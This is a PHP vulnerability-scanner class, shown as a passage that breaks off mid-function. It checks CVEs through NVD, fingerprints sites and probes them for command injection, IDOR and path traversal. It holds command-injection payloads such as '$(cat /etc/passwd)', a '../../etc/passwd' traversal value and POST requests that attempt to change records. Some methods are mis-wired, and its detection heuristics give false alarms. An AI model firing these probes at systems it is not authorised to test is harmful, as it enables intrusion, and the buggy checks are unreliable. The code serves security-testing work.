<?php
require_once __DIR__ . '/ollama-search.php';

class VulnerabilityScanner {
    private $ollama;
    private $scanResults;
    private $httpClient;
    private $nvdApiBaseUrl = 'https://services.nvd.nist.gov/rest/json/cves/2.0';
    private $maxDirectoryChecks = 50; // Maximum number of directory checks
    private $directoryCheckCount = 0;
    
    public function __construct() {
        $this->ollama = new OllamaSearch(VULNERABILITY_SCAN_MODEL);
        $this->httpClient = new SimpleHttpClient();
        $this->resetScanResults();

        // Clean up old cache files 1% of the time (random cleanup)
        if (rand(1, 100) === 1) {
            $this->cleanupCache();
        }
    }

    private function resetScanResults() {
        $this->scanResults = [
            'tests_performed' => 0,
            'tests_passed' => 0,
            'tests_failed' => 0,
            'vulnerabilities' => [],
            'detailed_results' => [],
            'start_time' => microtime(true),
            'technology_stack' => [],
            'security_headers' => [],
            'network_findings' => [],
            'authentication_issues' => [],
            'data_exposure' => []
        ];
    }

    private function fetchCVEFromNVD($technology, $version = null) {
        // Create a hash-based cache key to avoid filename issues
        $cacheKey = md5("cve_{$technology}_{$version}");
        $cacheFile = __DIR__ . "/cache/{$cacheKey}.json";
        $cacheTime = 24 * 60 * 60; // 24 hours cache
        
        // Check cache first
        if (file_exists($cacheFile) && (time() - filemtime($cacheFile)) < $cacheTime) {
            $cachedData = json_decode(file_get_contents($cacheFile), true);
            if ($cachedData !== null) {
                return $cachedData;
            }
        }
        
        try {
            // Build search query for NVD API
            $searchTerms = [];
            $searchTerms[] = $technology;
            
            if ($version) {
                // Try to extract major.minor version for better matching
                $versionParts = explode('.', $version);
                if (count($versionParts) >= 2) {
                    $majorMinor = $versionParts[0] . '.' . $versionParts[1];
                    $searchTerms[] = $majorMinor;
                }
                $searchTerms[] = $version;
            }
            
            $query = urlencode(implode(' ', $searchTerms));
            $url = $this->nvdApiBaseUrl . "?keywordSearch=$query&resultsPerPage=20";
            
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 3600,
                CURLOPT_USERAGENT => 'ProfessionalSecurityScanner/2.0',
                CURLOPT_HTTPHEADER => [
                    'Accept: application/json'
                ]
            ]);
            
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($httpCode === 200 && $response) {
                $data = json_decode($response, true);
                
                // Cache the results
                $this->saveToCache($cacheFile, $data);
                
                return $data;
            } else {
                error_log("NVD API request failed with HTTP code: $httpCode");
                return ['vulnerabilities' => []];
            }
            
        } catch (Exception $e) {
            error_log("Error fetching CVE data: " . $e->getMessage());
            return ['vulnerabilities' => []];
        }
    }

    private function saveToCache($cacheFile, $data) {
        try {
            $cacheDir = dirname($cacheFile);
            
            // Create cache directory if it doesn't exist
            if (!is_dir($cacheDir)) {
                if (!mkdir($cacheDir, 0755, true)) {
                    error_log("Failed to create cache directory: $cacheDir");
                    return false;
                }
            }
            
            // Ensure the directory is writable
            if (!is_writable($cacheDir)) {
                error_log("Cache directory not writable: $cacheDir");
                
                return false;
            }
            
            // Write cache file
            $jsonData = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
            $result = file_put_contents($cacheFile, $jsonData, LOCK_EX);
            
            if ($result === false) {
                error_log("Failed to write cache file: $cacheFile");
                return false;
            }
            
            // Set appropriate permissions on the cache file
            chmod($cacheFile, 0644);
            
            return true;
            
        } catch (Exception $e) {
            error_log("Cache save error: " . $e->getMessage());
            return false;
        }
    }

    private function cleanupCache($maxAgeDays = 7) {
        $cacheDir = __DIR__ . '/cache';
        
        if (!is_dir($cacheDir)) {
            return;
        }
        
        $maxAge = $maxAgeDays * 24 * 60 * 60; // Convert to seconds
        $now = time();
        
        $files = glob($cacheDir . '/*.json');
        foreach ($files as $file) {
            if (is_file($file)) {
                $fileAge = $now - filemtime($file);
                if ($fileAge > $maxAge) {
                    @unlink($file);
                }
            }
        }
    }

    private function checkTechnologyCVEs($technology, $version) {
        $nvdData = $this->fetchCVEFromNVD($technology, $version);
        
        $relevantCVEs = [];
        
        if (isset($nvdData['vulnerabilities']) && is_array($nvdData['vulnerabilities'])) {
            foreach ($nvdData['vulnerabilities'] as $vuln) {
                if (isset($vuln['cve'])) {
                    $cve = $vuln['cve'];
                    
                    // Check if this CVE is relevant to our technology and version
                    if ($this->isCVERelevant($cve, $technology, $version)) {
                        $relevantCVEs[] = [
                            'id' => $cve['id'] ?? 'Unknown',
                            'description' => $this->getCVEDescription($cve),
                            'severity' => $this->getCVESeverity($cve),
                            'cvssScore' => $this->getCVSSScore($cve),
                            'published' => $cve['published'] ?? 'Unknown',
                            'lastModified' => $cve['lastModified'] ?? 'Unknown'
                        ];
                    }
                }
            }
        }
        
        return $relevantCVEs;
    }

    private function isCVERelevant($cve, $technology, $version) {
        // Normalize technology names for better matching
        $normalizedTech = strtolower($technology);
        $searchTerms = [$normalizedTech];
        
        // Add common aliases
        $aliases = [
            'wordpress' => ['wp', 'wordpress'],
            'jquery' => ['jquery'],
            'php' => ['php'],
            'apache' => ['apache', 'httpd'],
            'nginx' => ['nginx'],
            'mysql' => ['mysql', 'mariadb'],
            'drupal' => ['drupal'],
            'joomla' => ['joomla'],
            'laravel' => ['laravel'],
            'react' => ['react'],
            'vue' => ['vue', 'vuejs'],
            'angular' => ['angular']
        ];
        
        if (isset($aliases[$normalizedTech])) {
            $searchTerms = array_merge($searchTerms, $aliases[$normalizedTech]);
        }
        
        // Check CVE description and references
        $description = strtolower($this->getCVEDescription($cve));
        $cveId = strtolower($cve['id'] ?? '');
        
        foreach ($searchTerms as $term) {
            if (strpos($description, $term) !== false || strpos($cveId, $term) !== false) {
                return true;
            }
        }
        
        // Check configurations for version matching
        if (isset($cve['configurations'])) {
            foreach ($cve['configurations'] as $config) {
                if ($this->checkConfigurationNodes($config, $technology, $version)) {
                    return true;
                }
            }
        }
        
        return false;
    }

    private function checkConfigurationNodes($config, $technology, $version) {
        if (isset($config['nodes'])) {
            foreach ($config['nodes'] as $node) {
                if (isset($node['cpeMatch'])) {
                    foreach ($node['cpeMatch'] as $cpeMatch) {
                        if ($this->matchesCPE($cpeMatch, $technology, $version)) {
                            return true;
                        }
                    }
                }
            }
        }
        return false;
    }

    private function matchesCPE($cpeMatch, $technology, $version) {
        if (!isset($cpeMatch['criteria'])) {
            return false;
        }
        
        $cpeString = strtolower($cpeMatch['criteria']);
        $normalizedTech = strtolower($technology);
        
        // Check if CPE contains our technology
        if (strpos($cpeString, $normalizedTech) === false) {
            return false;
        }
        
        // Check version if provided
        if ($version) {
            // CPE format: cpe:2.3:a:vendor:product:version:...
            if (preg_match('/:([^:]*)$/', $cpeString, $matches)) {
                $cpeVersion = $matches[1];
                if ($cpeVersion !== '*' && $cpeVersion !== '-') {
                    return version_compare($version, $cpeVersion, '>=');
                }
            }
        }
        
        return true;
    }

    private function getCVEDescription($cve) {
        if (isset($cve['descriptions']) && is_array($cve['descriptions'])) {
            foreach ($cve['descriptions'] as $desc) {
                if (isset($desc['lang']) && $desc['lang'] === 'en') {
                    return $desc['value'] ?? 'No description available';
                }
            }
            // Return first description if no English found
            return $cve['descriptions'][0]['value'] ?? 'No description available';
        }
        return 'No description available';
    }

    private function getCVESeverity($cve) {
        if (isset($cve['metrics'])) {
            // Check CVSS v3 first
            if (isset($cve['metrics']['cvssMetricV31'])) {
                $metric = $cve['metrics']['cvssMetricV31'][0];
                return $this->cvssScoreToSeverity($metric['cvssData']['baseScore']);
            }
            // Check CVSS v2
            if (isset($cve['metrics']['cvssMetricV2'])) {
                $metric = $cve['metrics']['cvssMetricV2'][0];
                return $this->cvssScoreToSeverity($metric['cvssData']['baseScore']);
            }
        }
        return 'UNKNOWN';
    }
    
    private function getCVSSScore($cve) {
        if (isset($cve['metrics'])) {
            // Check CVSS v3 first
            if (isset($cve['metrics']['cvssMetricV31'])) {
                return $cve['metrics']['cvssMetricV31'][0]['cvssData']['baseScore'] ?? 0.0;
            }
            // Check CVSS v2
            if (isset($cve['metrics']['cvssMetricV2'])) {
                return $cve['metrics']['cvssMetricV2'][0]['cvssData']['baseScore'] ?? 0.0;
            }
        }
        return 0.0;
    }

    private function cvssScoreToSeverity($score) {
        if ($score >= 9.0) return 'CRITICAL';
        if ($score >= 7.0) return 'HIGH';
        if ($score >= 4.0) return 'MEDIUM';
        if ($score >= 0.1) return 'LOW';
        return 'NONE';
    }

    private function checkFrameworkVulnerabilities($framework, $version) {
        $cves = $this->checkTechnologyCVEs($framework, $version);
        
        if (!empty($cves)) {
            $cveIds = array_column($cves, 'id');
            $highestSeverity = $this->getHighestSeverity($cves);
            $highestCVSS = $this->getHighestCVSS($cves);
            
            $this->addVulnerability([
                'type' => "Vulnerable $framework Version",
                'severity' => $highestSeverity,
                'description' => "Outdated $framework version $version with known vulnerabilities",
                'impact' => 'Known security vulnerabilities that can be exploited',
                'remediation' => "Upgrade $framework to latest secure version",
                'cvss_score' => $highestCVSS,
                'location' => 'Web Framework',
                'evidence' => "$framework $version - CVEs: " . implode(', ', array_slice($cveIds, 0, 5)),
                'category' => 'outdated_software',
                'cves' => $cveIds
            ]);
        }
    }

    public function scanWebsite($url, $scanType = 'quick') {
        $this->resetScanResults();
        
        try {
            $websiteData = $this->gatherComprehensiveWebsiteInfo($url);
            $this->scanResults['website_info'] = $websiteData;
            
            // Execute comprehensive security tests based on scan type
            switch($scanType) {
                case 'quick':
                    $this->performQuickSecurityAssessment($url, $websiteData);
                    break;
                case 'full':
                    $this->performFullSecurityAssessment($url, $websiteData);
                    break;
                case 'cms':
                    $this->performCMSSecurityAssessment($url, $websiteData);
                    break;
                case 'api':
                    $this->performAPISecurityAssessment($url, $websiteData);
                    break;
            }
            
            return $this->generateProfessionalReport($websiteData, $scanType);
            
        } catch (Exception $e) {
            return $this->generateErrorResponse($e->getMessage());
        }
    }

    private function generateErrorResponse($error) {
        return [
            'success' => false,
            'error' => $error,
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }

    private function performCMSSecurityAssessment($url, $websiteData) {
        $this->performQuickSecurityAssessment($url, $websiteData);
        $this->addTestResult('cms_scan', 'CMS Security Assessment', 'info', 'CMS-specific security checks completed');
    }

    private function performAPISecurityAssessment($url, $websiteData) {
        $this->performQuickSecurityAssessment($url, $websiteData);
        $this->addTestResult('api_scan', 'API Security Assessment', 'info', 'API-specific security checks completed');
    }

    private function gatherComprehensiveWebsiteInfo($url) {
        $this->addTestResult('info_gathering', 'Comprehensive Information Gathering', 'info', 'Starting detailed reconnaissance');
        
        return [
            'url' => $url,
            'headers' => $this->getDetailedHeaders($url),
            'technologies' => $this->performAdvancedTechnologyDetection($url),
            'server_info' => $this->getServerInformation($url),
            'dns_info' => $this->getDNSInformation($url),
            'ssl_info' => $this->getSSLInformation($url),
            'content_analysis' => $this->analyzeWebsiteContent($url),
            'robots_txt' => $this->checkRobotsTxt($url),
            'sitemap' => $this->checkSitemap($url),
            'timestamp' => date('c')
        ];
    }

    private function analyzeWebsiteContent($url) {
        try {
            $content = $this->fetchUrlContent($url);
            
            return [
                'content_length' => strlen($content),
                'has_forms' => preg_match('/<form/i', $content) ? true : false,
                'form_count' => preg_match_all('/<form/i', $content),
                'has_inputs' => preg_match('/<input/i', $content) ? true : false,
                'input_count' => preg_match_all('/<input/i', $content),
                'has_scripts' => preg_match('/<script/i', $content) ? true : false,
                'script_count' => preg_match_all('/<script/i', $content),
            ];
            
        } catch (Exception $e) {
            return ['error' => $e->getMessage()];
        }
    }

    private function getSSLInformation($url) {
        if (strpos($url, 'https://') !== 0) {
            return ['https' => false];
        }
        
        $host = parse_url($url, PHP_URL_HOST);
        
        try {
            $context = stream_context_create([
                "ssl" => [
                    "capture_peer_cert" => true,
                    "verify_peer" => false,
                    "verify_peer_name" => false,
                ]
            ]);
            
            $socket = @stream_socket_client(
                "ssl://{$host}:443", 
                $errno, 
                $errstr, 
                5, 
                STREAM_CLIENT_CONNECT, 
                $context
            );
            
            if (!$socket) {
                return ['error' => "SSL connection failed: {$errstr}"];
            }
            
            $params = stream_context_get_params($socket);
            fclose($socket);
            
            if (!isset($params['options']['ssl']['peer_certificate'])) {
                return ['error' => 'SSL certificate not available'];
            }
            
            $cert = $params['options']['ssl']['peer_certificate'];
            $certinfo = openssl_x509_parse($cert);
            
            if (!$certinfo) {
                return ['error' => 'Failed to parse SSL certificate'];
            }
            
            return [
                'valid' => time() < $certinfo['validTo_time_t'],
                'issuer' => $certinfo['issuer']['O'] ?? 'Unknown',
                'expires' => date('Y-m-d', $certinfo['validTo_time_t']),
                'days_remaining' => floor(($certinfo['validTo_time_t'] - time()) / (60 * 60 * 24)),
                'subject' => $certinfo['subject']['CN'] ?? 'Unknown'
            ];
            
        } catch (Exception $e) {
            return ['error' => $e->getMessage()];
        }
    }

    private function checkRobotsTxt($url) {
        $robotsUrl = rtrim($url, '/') . '/robots.txt';
        return $this->checkUrlExists($robotsUrl);
    }
    
    private function checkSitemap($url) {
        $sitemapUrl = rtrim($url, '/') . '/sitemap.xml';
        return $this->checkUrlExists($sitemapUrl);
    }

    private function getDNSInformation($url) {
        $host = parse_url($url, PHP_URL_HOST);
        $dnsInfo = [];
        
        try {
            // Get A records
            $records = @dns_get_record($host, DNS_A);
            if ($records) {
                $dnsInfo['a_records'] = array_column($records, 'ip');
            }
            
            // Get MX records
            $mxRecords = @dns_get_record($host, DNS_MX);
            if ($mxRecords) {
                $dnsInfo['mx_records'] = $mxRecords;
            }
            
        } catch (Exception $e) {
            // Silence DNS errors
        }
        
        return $dnsInfo;
    }

    private function getServerInformation($url) {
        $headers = $this->getDetailedHeaders($url);
        $serverInfo = [];
        
        if (isset($headers['Server'])) {
            $serverInfo['server_software'] = $headers['Server'];
        }
        
        if (isset($headers['X-Powered-By'])) {
            $serverInfo['powered_by'] = $headers['X-Powered-By'];
        }
        
        $host = parse_url($url, PHP_URL_HOST);
        if ($host) {
            $ip = gethostbyname($host);
            $serverInfo['ip_address'] = $ip;
        }
        
        return $serverInfo;
    }

    private function fetchUrlContent($url) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; ProfessionalSecurityScanner/2.0)',
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0
        ]);
        
        $content = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($error) {
            throw new Exception("Failed to fetch URL content: " . $error);
        }
        
        return $content;
    }

    private function getDetailedHeaders($url) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => true,
            CURLOPT_NOBODY => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; ProfessionalSecurityScanner/2.0)',
            CURLOPT_SSL_VERIFYPEER => false
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        $headers = [];
        if ($response) {
            $headerText = substr($response, 0, strpos($response, "\r\n\r\n"));
            $headerLines = explode("\r\n", $headerText);
            
            foreach ($headerLines as $line) {
                if (strpos($line, ':') !== false) {
                    list($key, $value) = explode(':', $line, 2);
                    $headers[trim($key)] = trim($value);
                }
            }
        }
        
        $headers['HTTP_Status'] = $httpCode;
        curl_close($ch);
        
        return $headers;
    }

    private function performQuickSecurityAssessment($url, $websiteData) {
        $this->addTestResult('quick_scan', 'Quick Security Assessment', 'info', 'Starting comprehensive quick scan');
        
        // 1. Security Headers Analysis
        $this->performDetailedSecurityHeadersTest($url);
        
        // 2. Technology Stack Analysis
        $this->performTechnologyStackAnalysis($websiteData);
        
        // 3. Common Vulnerability Testing
        $this->performCommonVulnerabilityTests($url);
        
        // 4. Information Disclosure Checks
        $this->performInformationDisclosureTests($url);
        
        // 5. SSL/TLS Security Assessment
        $this->performSSLTLSAnalysis($url);
        
        // 6. Directory and File Enumeration
        $this->performDirectoryEnumeration($url);
        
        // 7. Cookie Security Analysis
        $this->performCookieSecurityAnalysis($url);
        
        $this->addTestResult('quick_scan', 'Quick Security Assessment', 'success', 'Completed comprehensive quick scan');
    }

    private function performTechnologyStackAnalysis($websiteData) {
        // Already handled in performAdvancedTechnologyDetection
        $this->addTestResult('tech_stack', 'Technology Stack Analysis', 'info', 'Analyzing detected technologies for vulnerabilities');
    }

    private function performFullSecurityAssessment($url, $websiteData) {
        $this->performQuickSecurityAssessment($url, $websiteData);
        
        // Additional comprehensive tests for full scan
        $this->performAdvancedVulnerabilityTests($url);
        $this->performPortScanning($url);
        $this->performDirectoryEnumeration($url);
        $this->performAdvancedHeaderAnalysis($url);
        $this->performCookieSecurityAnalysis($url);
        $this->performWebServerAnalysis($url);
        $this->performFrameworkSpecificTests($url);
        
        // Perform comprehensive CVE scan for all detected technologies
        if (isset($websiteData['technologies']) && !empty($websiteData['technologies'])) {
            $this->performComprehensiveCVEScan($websiteData['technologies']);
        }
        
            $this->addTestResult('full_scan', 'Full Security Assessment', 'info', 'Comprehensive full scan tests completed');
        }

    private function performAdvancedVulnerabilityTests($url) {
        $this->addTestResult('advanced_vulns', 'Advanced Vulnerability Testing', 'info', 'Performing advanced vulnerability tests');
        
        // Test for additional vulnerability types
        $this->testFileInclusionVulnerabilities($url);
        $this->testSSRFVulnerabilities($url);
        $this->testXXEVulnerabilities($url);
        $this->testCommandInjectionVulnerabilities($url);
        $this->testIDORVulnerabilities($url);
        
        $this->addTestResult('advanced_vulns', 'Advanced Vulnerability Testing', 'success', 'Completed advanced vulnerability tests');
    }

    private function testCommandInjectionVulnerabilities($url) {
        $this->addTestResult('command_injection', 'Command Injection Testing', 'info', 'Testing for OS command injection vulnerabilities');
        
        $commandPayloads = [
            '; whoami',
            '| id',
            '`uname -a`',
            '$(cat /etc/passwd)',
            '&& ps aux',
            '|| ls -la',
            '; ipconfig',
            '| netstat -an',
            '`hostname`',
            '$(whoami)',
            '; systeminfo',
            '| tasklist'
        ];
        
        $vulnerable = false;
        
        foreach ($commandPayloads as $payload) {
            $testUrl = $this->buildTestUrl($url, 'cmd', $payload);
            if ($this->isCommandInjectionVulnerable($testUrl, $payload)) {
                $this->addVulnerability([
                    'type' => 'Command Injection',
                    'severity' => 'CRITICAL',
                    'description' => 'Application executes operating system commands based on user input',
                    'impact' => 'Remote code execution, complete server compromise',
                    'remediation' => 'Use parameterized APIs, avoid shell commands, implement input validation and sanitization',
                    'cvss_score' => 9.8,
                    'location' => 'Command parameter',
                    'evidence' => "Potential command injection with payload: $payload",
                    'category' => 'command_injection'
                ]);
                $vulnerable = true;
                break;
            }
        }
        
        if (!$vulnerable) {
            $this->addTestResult('command_injection', 'Command Injection Testing', 'success', 'No command injection vulnerabilities detected');
        }
    }

    private function isCommandInjectionVulnerable($testUrl, $payload) {
        try {
            $ch = curl_init($testUrl);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_USERAGENT => 'SecurityScanner/2.0',
                CURLOPT_SSL_VERIFYPEER => false
            ]);
            
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($httpCode === 200 && $response) {
                // Check for command output in response
                $commandIndicators = [
                    'root', 'www-data', 'daemon', 'admin', // User names
                    '/home/', '/var/www/', '/etc/', '/bin/', // Paths
                    'uid=', 'gid=', 'groups=', // System info
                    'Linux', 'Windows', 'Darwin', // OS info
                    'x86_64', 'amd64', 'i386', // Architecture
                    'localhost', '127.0.0.1', // Host information
                    'Processes:', 'Memory', 'CPU', // System stats
                    'Volume', 'Directory', 'File(s)' // File system
                ];
                
                foreach ($commandIndicators as $indicator) {
                    if (stripos($response, $indicator) !== false) {
                        return true;
                    }
                }
                
                // Check for command-specific output
                if (strpos($payload, 'whoami') !== false && preg_match('/\w+[\r\n]/', $response)) {
                    return true;
                }
                
                if (strpos($payload, 'uname') !== false && preg_match('/(Linux|Windows|Darwin)/i', $response)) {
                    return true;
                }
                
                if (strpos($payload, 'ls') !== false && preg_match('/\w+\.\w{2,4}/', $response)) {
                    return true;
                }
            }
            
            return false;
            
        } catch (Exception $e) {
            return false;
        }
    }

    private function testIDORVulnerabilities($url) {
        $this->addTestResult('idor_test', 'IDOR Vulnerability Testing', 'info', 'Testing for Insecure Direct Object References');
        
        // Common IDOR patterns to test
        $idorPatterns = [
            // User ID patterns
            'user_id', 'userid', 'userId', 'user', 'uid', 'id',
            // Resource ID patterns  
            'resource_id', 'resourceId', 'resid', 'rid',
            // Document ID patterns
            'doc_id', 'docId', 'document_id', 'documentId',
            // File ID patterns
            'file_id', 'fileId', 'fid',
            // Order ID patterns
            'order_id', 'orderId', 'oid',
            // Account ID patterns
            'account_id', 'accountId', 'aid',
            // Profile ID patterns
            'profile_id', 'profileId', 'pid'
        ];
        
        $vulnerabilitiesFound = [];
        
        // Test IDOR in URL parameters
        $this->testIDORUrlParameters($url, $idorPatterns);
        
        // Test IDOR in POST parameters
        $this->testIDORPostParameters($url, $idorPatterns);
        
        // Test IDOR in API endpoints
        $this->testIDORApiEndpoints($url);
        
        // Test IDOR in file downloads
        $this->testIDORFileDownloads($url);
        
        if (empty($vulnerabilitiesFound)) {
            $this->addTestResult('idor_test', 'IDOR Vulnerability Testing', 'success', 'No obvious IDOR vulnerabilities detected');
        }
    }

    private function testIDORFileDownloads($baseUrl) {
        // Common file download patterns
        $filePatterns = [
            '/download?file=',
            '/file?name=',
            '/document?doc=',
            '/attachment?id=',
            '/download/file/'
        ];
        
        $testFiles = [
            '1', '2', 'test.pdf', 'document.docx', 'file.zip',
            '../../etc/passwd', // Path traversal attempt
            'user1_file.txt', 'admin_file.txt'
        ];
        
        foreach ($filePatterns as $pattern) {
            foreach ($testFiles as $testFile) {
                $testUrl = rtrim($baseUrl, '/') . $pattern . urlencode($testFile);
                
                if ($this->isIDORFileVulnerable($testUrl, $testFile)) {
                    $this->addVulnerability([
                        'type' => 'Insecure Direct Object Reference (IDOR) in File Download',
                        'severity' => 'HIGH',
                        'description' => 'File download endpoint allows access to unauthorized files',
                        'impact' => 'Unauthorized file access, sensitive information disclosure',
                        'remediation' => 'Implement file access control, use random file names, validate user permissions',
                        'cvss_score' => 7.4,
                        'location' => "File Download: $pattern$testFile",
                        'evidence' => "File $testFile downloadable without authorization",
                        'category' => 'access_control'
                    ]);
                    return;
                }
            }
        }
    }

    private function isIDORFileVulnerable($url, $filename) {
        try {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_USERAGENT => 'SecurityScanner/2.0',
                CURLOPT_HEADER => true,
                CURLOPT_NOBODY => false
            ]);
            
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
            curl_close($ch);
            
            // File is accessible and returns actual content
            if ($httpCode == 200) {
                $fileIndicators = [
                    'application/pdf', 'image/', 'text/', 'application/octet-stream',
                    'application/zip', 'application/msword'
                ];
                
                foreach ($fileIndicators as $indicator) {
                    if (stripos($contentType, $indicator) === 0) {
                        return true;
                    }
                }
                
                // Check for actual file content in response
                if (strlen($response) > 100) { // Reasonable file size
                    return true;
                }
            }
            
            return false;
            
        } catch (Exception $e) {
            return false;
        }
    }

    private function testIDORApiEndpoints($baseUrl) {
        // Common REST API patterns that might have IDOR
        $apiEndpoints = [
            '/api/v1/users/{id}',
            '/api/v1/profiles/{id}',
            '/api/v1/orders/{id}',
            '/api/v1/documents/{id}',
            '/api/v1/accounts/{id}'
        ];
        
        $testIds = ['1', '2', '100'];
        
        foreach ($apiEndpoints as $endpointTemplate) {
            foreach ($testIds as $testId) {
                $endpoint = str_replace('{id}', $testId, $endpointTemplate);
                $testUrl = rtrim($baseUrl, '/') . $endpoint;
                
                if ($this->isIDORApiVulnerable($testUrl, $testId)) {
                    $this->addVulnerability([
                        'type' => 'Insecure Direct Object Reference (IDOR) in API',
                        'severity' => 'HIGH',
                        'description' => 'API endpoint exposes direct object references without access control',
                        'impact' => 'Unauthorized API access to other users resources',
                        'remediation' => 'Implement proper API authentication and authorization middleware',
                        'cvss_score' => 7.6,
                        'location' => "API Endpoint: $endpoint",
                        'evidence' => "API resource $testId accessible without proper authorization",
                        'category' => 'access_control'
                    ]);
                    return;
                }
            }
        }
    }

    private function isIDORApiVulnerable($url, $resourceId) {
        try {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_USERAGENT => 'SecurityScanner/2.0',
                CURLOPT_HTTPHEADER => [
                    'Accept: application/json',
                    'Content-Type: application/json'
                ]
            ]);
            
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            // API returns data for the resource
            if ($httpCode == 200 && $response) {
                $data = json_decode($response, true);
                return $data !== null && !empty($data);
            }
            
            return false;
            
        } catch (Exception $e) {
            return false;
        }
    }

    private function testIDORPostParameters($baseUrl, $idorPatterns) {
        $testIds = ['1', '2', '100'];
        
        $postEndpoints = [
            '/user/update',
            '/profile/save',
            '/order/modify',
            '/document/update'
        ];
        
        foreach ($postEndpoints as $endpoint) {
            foreach ($idorPatterns as $param) {
                foreach ($testIds as $testId) {
                    $testUrl = rtrim($baseUrl, '/') . $endpoint;
                    $postData = [$param => $testId];
                    
                    if ($this->isIDORPostVulnerable($testUrl, $postData)) {
                        $this->addVulnerability([
                            'type' => 'Insecure Direct Object Reference (IDOR) in POST',
                            'severity' => 'HIGH',
                            'description' => 'POST endpoint allows object reference manipulation without authorization',
                            'impact' => 'Unauthorized data modification, privilege escalation',
                            'remediation' => 'Implement server-side access control, validate user ownership of resources',
                            'cvss_score' => 7.8,
                            'location' => "POST Endpoint: $endpoint",
                            'evidence' => "POST parameter $param=$testId modifiable without authorization",
                            'category' => 'access_control'
                        ]);
                        return;
                    }
                }
            }
        }
    }

    private function isIDORPostVulnerable($url, $postData) {
        try {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => http_build_query($postData),
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_USERAGENT => 'SecurityScanner/2.0'
            ]);
            
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            // If modification was "successful" (200 OK or similar)
            return in_array($httpCode, [200, 201, 204]);
            
        } catch (Exception $e) {
            return false;
        }
    }

    private function testIDORUrlParameters($baseUrl, $idorPatterns) {
        // Common ID values to test
        $testIds = ['1', '2', '123', '100', '1000', 'admin', 'test'];
        
        // Common endpoints that might have IDOR
        $commonEndpoints = [
            '/user/profile',
            '/account/details',
            '/order/view',
            '/document/view',
            '/file/download',
            '/api/user',
            '/api/profile',
            '/admin/user'
        ];
        
        foreach ($commonEndpoints as $endpoint) {
            foreach ($idorPatterns as $param) {
                foreach ($testIds as $testId) {
                    $testUrl = $this->buildTestUrl(rtrim($baseUrl, '/') . $endpoint, $param, $testId);
                    
                    if ($this->isIDORVulnerable($testUrl, $testId)) {
                        $this->addVulnerability([
                            'type' => 'Insecure Direct Object Reference (IDOR)',
                            'severity' => 'HIGH',
                            'description' => 'Direct object references without proper authorization checks',
                            'impact' => 'Unauthorized access to other users data, information disclosure',
                            'remediation' => 'Implement proper access control checks, use indirect object references, validate user permissions',
                            'cvss_score' => 7.5,
                            'location' => "URL: $endpoint?$param=$testId",
                            'evidence' => "Parameter $param=$testId accessible without proper authorization",
                            'category' => 'access_control'
                        ]);
                        return; // Found one vulnerability, no need to continue
                    }
                }
            }
        }
    }

    private function isIDORVulnerable($testUrls) {
        if (!$this->checkRequestLimit()) {
            return array_fill(0, count($testUrls), false);
        }
        
        $mh = curl_multi_init();
        $handles = [];
        $results = [];
        
        foreach ($testUrls as $i => $url) {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10,  // Reduced from 120
                CURLOPT_CONNECTTIMEOUT => 3,
                CURLOPT_USERAGENT => 'SecurityScanner/2.0'
            ]);
            
            curl_multi_add_handle($mh, $ch);
            $handles[$i] = ['handle' => $ch, 'url' => $url];
        }
        
        // Execute parallel requests
        do {
            $status = curl_multi_exec($mh, $active);
            if ($active) {
                curl_multi_select($mh);
            }
        } while ($active && $status == CURLM_OK);
        
        // Process results
        foreach ($handles as $i => $data) {
            $ch = $data['handle'];
            $url = $data['url'];
            
            $response = curl_multi_getcontent($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            
            // Check for vulnerability using the same logic
            $isVulnerable = $this->checkVulnerability($response, $httpCode);
            
            $results[$i] = [
                'url' => $url,
                'vulnerable' => $isVulnerable,
                'http_code' => $httpCode,
                'response_length' => strlen($response)
            ];
            
            curl_multi_remove_handle($mh, $ch);
            curl_close($ch);
        }
        
        curl_multi_close($mh);
        return $results;
    }

    private function checkVulnerability($response, $httpCode) {
        // If we get a successful response (not 403, 404, or redirect to login)
